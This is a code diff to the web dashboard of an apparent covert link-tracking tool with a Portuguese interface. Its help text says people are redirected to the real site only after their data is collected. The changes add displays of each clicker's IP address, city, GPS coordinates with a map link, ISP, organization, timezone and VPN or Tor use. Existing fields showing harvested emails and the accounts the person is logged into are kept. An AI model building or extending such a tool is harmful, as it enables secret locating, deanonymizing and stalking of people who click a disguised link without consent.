@@ -539,15 +539,19 @@
                 <div id="alertContainer"></div>
                 <form id="createLinkForm">
                     <div class="form-group">
-                        <label for="url">URL de Destino:</label>
+                        <label for="url">URL de Destino (Seu App na Vercel):</label>
                         <input 
                             type="url" 
                             id="url" 
                             name="url" 
-                            placeholder="https://exemplo.com" 
+                            placeholder="https://seu-app.vercel.app" 
                             required
                             autocomplete="off"
                         >
+                        <small style="display: block; margin-top: 5px; color: #666; font-size: 12px;">
+                            🔗 Esta é a URL final para onde o usuário será redirecionado após coletar os dados.<br>
+                            <strong>Exemplo:</strong> https://meuapp.vercel.app ou https://meuapp.com.br
+                        </small>
                     </div>
                     <div class="form-group">
                         <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
@@ -765,7 +769,33 @@
                     return;
                 }
 
-                linksList.innerHTML = links.map(link => `
+                // Carregar IPs únicos para cada link
+                const linksWithStats = await Promise.all(links.map(async (link) => {
+                    try {
+                        const clicksRes = await fetch(`/api/link/${link.id}`);
+                        const clicksData = await clicksRes.json();
+                        const uniqueIPs = new Set();
+                        const locations = new Set();
+                        clicksData.clicks.forEach(click => {
+                            if (click.ip_address) uniqueIPs.add(click.ip_address);
+                            if (click.data?.geoLocation) {
+                                const geo = click.data.geoLocation;
+                                const loc = [geo.city, geo.region, geo.country].filter(Boolean).join(', ');
+                                if (loc) locations.add(loc);
+                            }
+                        });
+                        return { 
+                            ...link, 
+                            uniqueIPs: uniqueIPs.size, 
+                            totalClicks: clicksData.clicks.length,
+                            locations: Array.from(locations).slice(0, 3) // Primeiras 3 localizações
+                        };
+                    } catch (e) {
+                        return { ...link, uniqueIPs: 0, totalClicks: 0, locations: [] };
+                    }
+                }));
+
+                linksList.innerHTML = linksWithStats.map(link => `
                     <div class="link-item" onclick="viewLinkData('${link.id}')">
                         <div class="link-header">
                             <div>
@@ -777,14 +807,23 @@
                             </div>
                         </div>
                         <div class="link-stats">
-                            <div class="link-stat">
-                                <div class="link-stat-value">${link.click_count || 0}</div>
-                                <div class="link-stat-label">Cliques</div>
+                            <div class="link-stat" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
+                                <div class="link-stat-value" style="color: white;">${link.totalClicks || 0}</div>
+                                <div class="link-stat-label" style="color: rgba(255,255,255,0.9);">Cliques</div>
                             </div>
-                            <div class="link-stat">
-                                <div class="link-stat-value">${link.id}</div>
-                                <div class="link-stat-label">ID do Link</div>
+                            <div class="link-stat" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white;">
+                                <div class="link-stat-value" style="color: white;">${link.uniqueIPs || 0}</div>
+                                <div class="link-stat-label" style="color: rgba(255,255,255,0.9);">IPs Únicos</div>
                             </div>
+                            ${link.locations.length > 0 ? `
+                            <div class="link-stat" style="grid-column: span 2; text-align: left; padding: 12px;">
+                                <div style="font-size: 11px; color: #666; margin-bottom: 5px;">📍 Localizações Detectadas:</div>
+                                <div style="font-size: 13px; color: #333; font-weight: 600;">
+                                    ${link.locations.join(' • ')}
+                                    ${link.locations.length >= 3 ? '...' : ''}
+                                </div>
+                            </div>
+                            ` : ''}
                         </div>
                         <div class="link-actions-bar">
                             <button class="btn btn-sm" onclick="event.stopPropagation(); copyTrackingUrl('${link.id}')">
@@ -875,6 +914,23 @@
             const riskScore = click.risk_score || 0;
             const riskLevel = riskScore >= 70 ? 'HIGH' : riskScore >= 40 ? 'MEDIUM' : 'LOW';
             const vpnProxy = click.vpn_proxy ? JSON.parse(click.vpn_proxy) : {};
+            const geo = clickData.geoLocation || {};
+            const additionalGeo = geo.additional || {};
+            
+            // Formatar localização completa
+            let locationText = '';
+            if (geo.city || geo.region || geo.country) {
+                const parts = [];
+                if (geo.city) parts.push(geo.city);
+                if (geo.region || additionalGeo.region) parts.push(geo.region || additionalGeo.region);
+                if (geo.country || additionalGeo.country) parts.push(geo.country || additionalGeo.country);
+                locationText = parts.join(', ');
+            }
+            
+            // Coordenadas
+            const lat = geo.latitude || geo.coordinates?.lat || additionalGeo.latitude;
+            const lng = geo.longitude || geo.coordinates?.lng || additionalGeo.longitude;
+            const coords = lat && lng ? `${lat}, ${lng}` : null;
             
             return `
                 <div class="data-section">
@@ -884,38 +940,95 @@
                         ${vpnProxy.isProxy ? '<span class="vpn-badge">PROXY</span>' : ''}
                         ${vpnProxy.isTor ? '<span class="vpn-badge">TOR</span>' : ''}
                     </h3>
-                    <div class="data-item">
-                        <span class="data-key">IP:</span>
-                        <span class="data-value">${click.ip_address || 'N/A'}</span>
+                    
+                    <!-- SEÇÃO DESTACADA: IP E LOCALIZAÇÃO -->
+                    <div class="ip-location-section" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 12px; margin: 20px 0; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);">
+                        <h4 style="margin: 0 0 20px 0; font-size: 18px; display: flex; align-items: center; gap: 10px;">
+                            🌍 IP E LOCALIZAÇÃO
+                        </h4>
+                        
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px;">
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">📍 ENDEREÇO IP</div>
+                                <div style="font-size: 20px; font-weight: bold; font-family: 'Courier New', monospace;">${click.ip_address || 'N/A'}</div>
+                            </div>
+                            
+                            ${locationText ? `
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">🗺️ LOCALIZAÇÃO</div>
+                                <div style="font-size: 18px; font-weight: bold;">${locationText}</div>
+                            </div>
+                            ` : ''}
+                            
+                            ${coords ? `
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">📐 COORDENADAS</div>
+                                <div style="font-size: 16px; font-weight: bold; font-family: 'Courier New', monospace;">${coords}</div>
+                                <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color: white; text-decoration: underline; font-size: 12px; margin-top: 5px; display: inline-block;">Ver no Google Maps</a>
+                            </div>
+                            ` : ''}
+                            
+                            ${additionalGeo.isp || geo.isp ? `
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">🌐 ISP / PROVEDOR</div>
+                                <div style="font-size: 14px; font-weight: bold;">${additionalGeo.isp || geo.isp || 'N/A'}</div>
+                            </div>
+                            ` : ''}
+                            
+                            ${additionalGeo.organization || geo.organization ? `
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">🏢 ORGANIZAÇÃO</div>
+                                <div style="font-size: 14px; font-weight: bold;">${additionalGeo.organization || geo.organization || 'N/A'}</div>
+                            </div>
+                            ` : ''}
+                            
+                            ${geo.timezone || additionalGeo.timezone ? `
+                            <div style="background: rgba(255,255,255,0.15); padding: 15px; border-radius: 8px; backdrop-filter: blur(10px);">
+                                <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">🕐 TIMEZONE</div>
+                                <div style="font-size: 14px; font-weight: bold;">${geo.timezone || additionalGeo.timezone || 'N/A'}</div>
+                            </div>
+                            ` : ''}
+                        </div>
+                        
+                        ${vpnProxy.isVPN || vpnProxy.isProxy || vpnProxy.isTor ? `
+                        <div style="margin-top: 15px; padding: 12px; background: rgba(255,0,0,0.2); border-radius: 8px; border-left: 4px solid #ff4444;">
+                            <div style="font-size: 12px; opacity: 0.9; margin-bottom: 5px;">⚠️ ANONIMIZAÇÃO DETECTADA</div>
+                            <div style="font-size: 14px;">
+                                ${vpnProxy.isVPN ? '<span style="background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px; margin-right: 5px;">VPN</span>' : ''}
+                                ${vpnProxy.isProxy ? '<span style="background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px; margin-right: 5px;">PROXY</span>' : ''}
+                                ${vpnProxy.isTor ? '<span style="background: rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px; margin-right: 5px;">TOR</span>' : ''}
+                                ${vpnProxy.provider ? `<span style="font-size: 12px; opacity: 0.8;">(${vpnProxy.provider})</span>` : ''}
+                            </div>
+                        </div>
+                        ` : ''}
                     </div>
-                    ${clickData.browser ? `
-                        <div class="data-item">
-                            <span class="data-key">Navegador:</span>
-                            <span class="data-value">${clickData.parsedUserAgent?.browser || clickData.browser.userAgent || 'N/A'}</span>
-                        </div>
-                        <div class="data-item">
-                            <span class="data-key">Sistema Operacional:</span>
-                            <span class="data-value">${clickData.parsedUserAgent?.os || 'N/A'}</span>
-                        </div>
-                    ` : ''}
-                    ${clickData.geoLocation ? `
-                        <div class="data-item">
-                            <span class="data-key">Localização:</span>
-                            <span class="data-value">${clickData.geoLocation.city || ''}, ${clickData.geoLocation.region || ''}, ${clickData.geoLocation.country || ''}</span>
-                        </div>
-                    ` : ''}
-                    ${clickData.accounts && clickData.accounts.emails && clickData.accounts.emails.length > 0 ? `
-                        <div class="data-item">
-                            <span class="data-key">Emails:</span>
-                            <span class="data-value">${clickData.accounts.emails.join(', ')}</span>
-                        </div>
-                    ` : ''}
-                    ${clickData.accounts && clickData.accounts.linkedAccounts ? `
-                        <div class="data-item">
-                            <span class="data-key">Contas Vinculadas:</span>
-                            <span class="data-value">${Object.keys(clickData.accounts.linkedAccounts).filter(s => clickData.accounts.linkedAccounts[s].loggedIn).join(', ') || 'Nenhuma'}</span>
-                        </div>
-                    ` : ''}
+                    
+                    <!-- Outras informações -->
+                    <div style="margin-top: 20px;">
+                        <h4 style="color: #667eea; margin-bottom: 15px; font-size: 16px;">📱 Informações Adicionais</h4>
+                        ${clickData.browser ? `
+                            <div class="data-item">
+                                <span class="data-key">Navegador:</span>
+                                <span class="data-value">${clickData.parsedUserAgent?.browser || clickData.browser.userAgent || 'N/A'}</span>
+                            </div>
+                            <div class="data-item">
+                                <span class="data-key">Sistema Operacional:</span>
+                                <span class="data-value">${clickData.parsedUserAgent?.os || 'N/A'}</span>
+                            </div>
+                        ` : ''}
+                        ${clickData.accounts && clickData.accounts.emails && clickData.accounts.emails.length > 0 ? `
+                            <div class="data-item">
+                                <span class="data-key">Emails:</span>
+                                <span class="data-value">${clickData.accounts.emails.join(', ')}</span>
+                            </div>
+                        ` : ''}
+                        ${clickData.accounts && clickData.accounts.linkedAccounts ? `
+                            <div class="data-item">
+                                <span class="data-key">Contas Vinculadas:</span>
+                                <span class="data-value">${Object.keys(clickData.accounts.linkedAccounts).filter(s => clickData.accounts.linkedAccounts[s].loggedIn).join(', ') || 'Nenhuma'}</span>
+                            </div>
+                        ` : ''}
+                    </div>
                 </div>
             `;
         }
